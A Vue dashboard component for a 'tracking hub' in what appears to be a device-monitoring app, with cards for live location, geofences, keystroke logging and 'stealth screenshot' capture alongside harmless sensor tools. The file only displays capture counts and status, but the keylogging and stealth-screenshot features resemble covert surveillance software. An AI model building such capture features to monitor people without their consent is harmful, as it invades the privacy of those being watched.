<template>
  <div class="hub-root">
    <div class="hub-header">
      <div class="hub-title-block">
        <i-lucide:radar class="hub-icon" />
        <div>
          <h2 class="hub-title">{{ $t('tracking_hub_title') }}</h2>
          <p class="hub-sub">{{ $t('tracking_hub_subtitle') }}</p>
        </div>
      </div>
    </div>

    <div class="hub-grid">
      <router-link to="/tracking-hub/live-location" class="hub-card live-card">
        <div class="card-icon-wrap">
          <i-lucide:map-pin class="card-icon" />
          <span v-if="locState?.running" class="status-dot live" />
        </div>
        <div class="card-body">
          <h3 class="card-title">{{ $t('hub_live_location_title') }}</h3>
          <p class="card-desc">{{ $t('hub_live_location_desc') }}</p>
          <div class="card-meta">
            <span class="chip" :class="{ on: locState?.running }">
              <i-lucide:activity v-if="locState?.running" />
              <i-lucide:circle v-else />
              {{ locState?.running ? $t('streaming') : $t('off') }}
            </span>
            <span v-if="locState" class="chip neutral">
              <i-lucide:database />
              {{ locState.totalPoints }} {{ $t('points') }}
            </span>
            <span v-if="locState?.latest" class="chip neutral">
              <i-lucide:clock />
              {{ formatRelative(locState.latest.ts) }}
            </span>
          </div>
        </div>
        <i-lucide:arrow-right class="card-chev" />
      </router-link>

      <router-link to="/tracking-hub/geofencing" class="hub-card geo-card">
        <div class="card-icon-wrap">
          <i-lucide:scan class="card-icon" />
          <span v-if="fenceCount > 0" class="status-dot busy" />
        </div>
        <div class="card-body">
          <h3 class="card-title">{{ $t('hub_geofencing_title') }}</h3>
          <p class="card-desc">{{ $t('hub_geofencing_desc') }}</p>
          <div class="card-meta">
            <span class="chip" :class="{ on: fenceCount > 0 }">
              <i-lucide:layers />
              {{ fenceCount }} {{ $t('fences') }}
            </span>
            <span class="chip neutral">
              <i-lucide:bell />
              {{ recentEventCount }} {{ $t('recent_events') }}
            </span>
          </div>
        </div>
        <i-lucide:arrow-right class="card-chev" />
      </router-link>

      <router-link to="/tracking-hub/keystrokes" class="hub-card key-card">
        <div class="card-icon-wrap">
          <i-lucide:keyboard class="card-icon" />
          <span v-if="kState?.enabled" class="status-dot live" />
        </div>
        <div class="card-body">
          <h3 class="card-title">{{ $t('hub_keystrokes_title') }}</h3>
          <p class="card-desc">{{ $t('hub_keystrokes_desc') }}</p>
          <div class="card-meta">
            <span class="chip" :class="{ on: kState?.enabled }">
              <i-lucide:circle-dot v-if="kState?.enabled" />
              <i-lucide:circle v-else />
              {{ kState?.enabled ? $t('streaming') : $t('off') }}
            </span>
            <span class="chip neutral">
              <i-lucide:database />
              {{ kState?.totalEntries || 0 }} {{ $t('entries') }}
            </span>
          </div>
        </div>
        <i-lucide:arrow-right class="card-chev" />
      </router-link>

      <router-link to="/tracking-hub/screenshots" class="hub-card shot-card">
        <div class="card-icon-wrap">
          <i-lucide:camera class="card-icon" />
          <span v-if="sState?.enabled" class="status-dot live" />
        </div>
        <div class="card-body">
          <h3 class="card-title">{{ $t('hub_screenshots_title') }}</h3>
          <p class="card-desc">{{ $t('hub_screenshots_desc') }}</p>
          <div class="card-meta">
            <span class="chip" :class="{ on: sState?.enabled }">
              <i-lucide:circle-dot v-if="sState?.enabled" />
              <i-lucide:circle v-else />
              {{ sState?.enabled ? $t('streaming') : $t('off') }}
            </span>
            <span class="chip neutral">
              <i-lucide:image />
              {{ sState?.totalShots || 0 }} {{ $t('shots') }}
            </span>
          </div>
        </div>
        <i-lucide:arrow-right class="card-chev" />
      </router-link>

      <router-link to="/tracking-hub/accelerometer" class="hub-card accel-card">
        <div class="card-icon-wrap">
          <i-lucide:activity class="card-icon" />
        </div>
        <div class="card-body">
          <h3 class="card-title">Accelerometer</h3>
          <p class="card-desc">Measure device acceleration, gravity & tilt in all axes live.</p>
          <div class="card-meta">
            <span class="chip neutral"><i-lucide:layers />Gravity · Motion</span>
            <span class="chip neutral"><i-lucide:compass />Angle</span>
          </div>
        </div>
        <i-lucide:arrow-right class="card-chev" />
      </router-link>

      <router-link to="/tracking-hub/vibrometer" class="hub-card vib-card">
        <div class="card-icon-wrap">
          <i-lucide:waves class="card-icon" />
        </div>
        <div class="card-body">
          <h3 class="card-title">Vibration Meter</h3>
          <p class="card-desc">Detect and measure vibration intensity from device motion sensors.</p>
          <div class="card-meta">
            <span class="chip neutral"><i-lucide:bar-chart-2 />m/s² Live</span>
            <span class="chip neutral"><i-lucide:trending-up />Chart</span>
          </div>
        </div>
        <i-lucide:arrow-right class="card-chev" />
      </router-link>

      <router-link to="/tracking-hub/sound-meter" class="hub-card sound-card">
        <div class="card-icon-wrap">
          <i-lucide:mic class="card-icon" />
        </div>
        <div class="card-body">
          <h3 class="card-title">Sound Meter</h3>
          <p class="card-desc">Measure ambient sound levels around the device in decibels.</p>
          <div class="card-meta">
            <span class="chip neutral"><i-lucide:volume-2 />dB Live</span>
            <span class="chip neutral"><i-lucide:info />Reference</span>
          </div>
        </div>
        <i-lucide:arrow-right class="card-chev" />
      </router-link>

      <router-link to="/tracking-hub/brightness-meter" class="hub-card bright-card">
        <div class="card-icon-wrap">
          <i-lucide:sun class="card-icon" />
        </div>
        <div class="card-body">
          <h3 class="card-title">Brightness Meter</h3>
          <p class="card-desc">Measure ambient light intensity in lux from environment.</p>
          <div class="card-meta">
            <span class="chip neutral"><i-lucide:sun />lux Live</span>
            <span class="chip neutral"><i-lucide:gauge />Gauge</span>
          </div>
        </div>
        <i-lucide:arrow-right class="card-chev" />
      </router-link>

      <router-link to="/tracking-hub/speedometer" class="hub-card speed-card">
        <div class="card-icon-wrap">
          <i-lucide:gauge class="card-icon" />
        </div>
        <div class="card-body">
          <h3 class="card-title">Speedometer</h3>
          <p class="card-desc">GPS-based real-time speed, distance, heading & trip stats.</p>
          <div class="card-meta">
            <span class="chip neutral"><i-lucide:navigation />GPS</span>
            <span class="chip neutral"><i-lucide:map />km/h Live</span>
          </div>
        </div>
        <i-lucide:arrow-right class="card-chev" />
      </router-link>

      <router-link to="/tracking-hub/mobile-torch" class="hub-card torch-card">
        <div class="card-icon-wrap">
          <i-lucide:zap class="card-icon" />
        </div>
        <div class="card-body">
          <h3 class="card-title">Mobile Torch</h3>
          <p class="card-desc">Control flashlight: Normal, SOS, Blinking Signal & Screen Colors.</p>
          <div class="card-meta">
            <span class="chip neutral"><i-lucide:zap />Flash</span>
            <span class="chip neutral"><i-lucide:asterisk />SOS · Blink</span>
          </div>
        </div>
        <i-lucide:arrow-right class="card-chev" />
      </router-link>
    </div>
  </div>
</template>

<script setup lang="ts">
import { ref, onMounted, onUnmounted } from 'vue'
import emitter from '@/plugins/eventbus'
import { gqlFetch } from '@/lib/api/gql-client'
import {
  locationTrackingStateGQL, geofencesGQL, geofenceEventsGQL,
  keystrokeStateGQL, stealthScreenshotStateGQL,
} from '@/lib/api/query'

interface ILocState {
  enabled: boolean
  running: boolean
  intervalSec: number
  minDisplacement: number
  totalPoints: number
  latest: any
}
interface IKState { enabled: boolean; accessibilityServiceConnected: boolean; bufferLimit: number; totalEntries: number }
interface ISState { enabled: boolean; accessibilityServiceConnected: boolean; supportedByOs: boolean; intervalMin: number; keepCount: number; totalShots: number }

const locState = ref<ILocState | null>(null)
const fenceCount = ref(0)
const recentEventCount = ref(0)
const kState = ref<IKState | null>(null)
const sState = ref<ISState | null>(null)

async function refresh() {
  try {
    const r = await gqlFetch<{ locationTrackingState: ILocState }>(locationTrackingStateGQL, {})
    if (!r.errors) locState.value = r.data.locationTrackingState
  } catch (_) {}
  try {
    const f = await gqlFetch<{ geofences: any[] }>(geofencesGQL, {})
    if (!f.errors) fenceCount.value = f.data.geofences.length
  } catch (_) {}
  try {
    const e = await gqlFetch<{ geofenceEvents: any[] }>(geofenceEventsGQL, { offset: 0, limit: 200, geofenceId: '' })
    if (!e.errors) {
      const oneDayAgo = Date.now() - 24 * 3600 * 1000
      recentEventCount.value = e.data.geofenceEvents.filter((x: any) => x.ts >= oneDayAgo).length
    }
  } catch (_) {}
  try {
    const k = await gqlFetch<{ keystrokeState: IKState }>(keystrokeStateGQL, {})
    if (!k.errors) kState.value = k.data.keystrokeState
  } catch (_) {}
  try {
    const s = await gqlFetch<{ stealthScreenshotState: ISState }>(stealthScreenshotStateGQL, {})
    if (!s.errors) sState.value = s.data.stealthScreenshotState
  } catch (_) {}
}

function formatRelative(ts: number): string {
  const diff = Date.now() - ts
  if (diff < 60_000) return Math.max(1, Math.round(diff / 1000)) + 's ago'
  if (diff < 3600_000) return Math.round(diff / 60_000) + 'm ago'
  if (diff < 86400_000) return Math.round(diff / 3600_000) + 'h ago'
  return Math.round(diff / 86400_000) + 'd ago'
}

function onLocUpdate(p: any) {
  if (locState.value) {
    locState.value.latest = p
    locState.value.totalPoints = p.totalPoints
  }
}
function onGeoEvent() { refresh() }
function onGeoChanged() { refresh() }
function onKeystrokeLogged(p: any) {
  if (kState.value && p && typeof p.totalEntries === 'number') kState.value.totalEntries = p.totalEntries
  else if (kState.value) kState.value.totalEntries++
}
function onShotCaptured(p: any) {
  if (sState.value && p && typeof p.totalShots === 'number') sState.value.totalShots = p.totalShots
  else if (sState.value) sState.value.totalShots++
}
function onKStateChanged() { refresh() }
function onSStateChanged() { refresh() }

onMounted(() => {
  refresh()
  emitter.on('location_update', onLocUpdate)
  emitter.on('geofence_event', onGeoEvent)
  emitter.on('geofences_changed', onGeoChanged)
  emitter.on('keystroke_logged', onKeystrokeLogged)
  emitter.on('screenshot_captured', onShotCaptured)
  emitter.on('keystroke_state_changed', onKStateChanged)
  emitter.on('screenshot_state_changed', onSStateChanged)
})
onUnmounted(() => {
  emitter.off('location_update', onLocUpdate)
  emitter.off('geofence_event', onGeoEvent)
  emitter.off('geofences_changed', onGeoChanged)
  emitter.off('keystroke_logged', onKeystrokeLogged)
  emitter.off('screenshot_captured', onShotCaptured)
  emitter.off('keystroke_state_changed', onKStateChanged)
  emitter.off('screenshot_state_changed', onSStateChanged)
})
</script>

<style scoped lang="scss">
.hub-root {
  padding: 18px 22px 28px;
  display: flex;
  flex-direction: column;
  gap: 22px;
  max-width: 1200px;
  margin: 0 auto;
}

.hub-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
}

.hub-title-block {
  display: flex;
  align-items: center;
  gap: 16px;
}

.hub-icon {
  width: 38px;
  height: 38px;
  color: var(--md-sys-color-primary);
  background: linear-gradient(135deg, rgba(99,102,241,0.18), rgba(168,85,247,0.18));
  padding: 9px;
  border-radius: 14px;
}

.hub-title { margin: 0; font-size: 1.45rem; font-weight: 700; }
.hub-sub { margin: 4px 0 0; color: var(--md-sys-color-on-surface-variant); font-size: 0.92rem; }

.hub-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
  gap: 18px;
}

.hub-card {
  display: flex;
  align-items: center;
  gap: 18px;
  padding: 22px;
  border-radius: 22px;
  text-decoration: none;
  color: inherit;
  cursor: pointer;
  transition: all 0.22s ease;
  border: 1px solid rgba(99,102,241,0.18);
  position: relative;
  overflow: hidden;
}
.hub-card:hover {
  transform: translateY(-3px);
  box-shadow: 0 12px 28px rgba(99,102,241,0.18);
}
.live-card {
  background: linear-gradient(135deg, rgba(99,102,241,0.08), rgba(168,85,247,0.05));
}
.geo-card {
  background: linear-gradient(135deg, rgba(34,197,94,0.08), rgba(56,189,248,0.05));
  border-color: rgba(34,197,94,0.25);
}
.key-card {
  background: linear-gradient(135deg, rgba(245,158,11,0.10), rgba(244,114,182,0.06));
  border-color: rgba(245,158,11,0.28);
}
.shot-card {
  background: linear-gradient(135deg, rgba(56,189,248,0.10), rgba(139,92,246,0.06));
  border-color: rgba(56,189,248,0.28);
}
.accel-card {
  background: linear-gradient(135deg, rgba(99,102,241,0.09), rgba(139,92,246,0.06));
  border-color: rgba(99,102,241,0.25);
  .card-icon { color: #6366f1; }
}
.vib-card {
  background: linear-gradient(135deg, rgba(239,68,68,0.08), rgba(245,158,11,0.06));
  border-color: rgba(239,68,68,0.22);
  .card-icon { color: #ef4444; }
}
.sound-card {
  background: linear-gradient(135deg, rgba(34,197,94,0.09), rgba(56,189,248,0.06));
  border-color: rgba(34,197,94,0.22);
  .card-icon { color: #16a34a; }
}
.bright-card {
  background: linear-gradient(135deg, rgba(245,158,11,0.10), rgba(251,191,36,0.06));
  border-color: rgba(245,158,11,0.25);
  .card-icon { color: #d97706; }
}
.speed-card {
  background: linear-gradient(135deg, rgba(13,148,136,0.09), rgba(56,189,248,0.06));
  border-color: rgba(13,148,136,0.24);
  .card-icon { color: #0d9488; }
}
.torch-card {
  background: linear-gradient(135deg, rgba(251,191,36,0.10), rgba(245,158,11,0.06));
  border-color: rgba(251,191,36,0.28);
  .card-icon { color: #f59e0b; }
}

.card-icon-wrap {
  position: relative;
  width: 56px;
  height: 56px;
  border-radius: 16px;
  background: var(--md-sys-color-surface);
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
}
.card-icon { width: 28px; height: 28px; color: var(--md-sys-color-primary); }
.status-dot {
  position: absolute;
  top: -2px;
  right: -2px;
  width: 14px;
  height: 14px;
  border-radius: 50%;
  border: 2px solid var(--md-sys-color-surface);
  box-shadow: 0 0 0 0 rgba(34,197,94,0.6);
}
.status-dot.live {
  background: #22c55e;
  animation: pulse 1.6s infinite;
}
.status-dot.busy { background: #f59e0b; }
@keyframes pulse {
  0%   { box-shadow: 0 0 0 0 rgba(34,197,94,0.6); }
  70%  { box-shadow: 0 0 0 8px rgba(34,197,94,0); }
  100% { box-shadow: 0 0 0 0 rgba(34,197,94,0); }
}

.card-body { flex: 1; min-width: 0; }
.card-title { margin: 0 0 4px; font-size: 1.1rem; font-weight: 700; }
.card-desc { margin: 0 0 10px; color: var(--md-sys-color-on-surface-variant); font-size: 0.86rem; line-height: 1.4; }
.card-meta { display: flex; flex-wrap: wrap; gap: 6px; }
.chip {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  padding: 3px 10px;
  border-radius: 999px;
  font-size: 0.74rem;
  font-weight: 600;
  background: var(--md-sys-color-surface-container);
  color: var(--md-sys-color-on-surface-variant);
}
.chip svg { width: 12px; height: 12px; }
.chip.on { background: rgba(34,197,94,0.16); color: #16a34a; }
.chip.neutral { background: var(--md-sys-color-surface-container-high); }

.card-chev {
  width: 24px;
  height: 24px;
  color: var(--md-sys-color-on-surface-variant);
  flex-shrink: 0;
}

.future-card {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 10px;
  padding: 16px;
  border-radius: 18px;
  border: 1px dashed rgba(99,102,241,0.3);
  background: rgba(99,102,241,0.04);
  color: var(--md-sys-color-on-surface-variant);
  font-size: 0.9rem;
}
.future-card svg { width: 18px; height: 18px; }
</style>
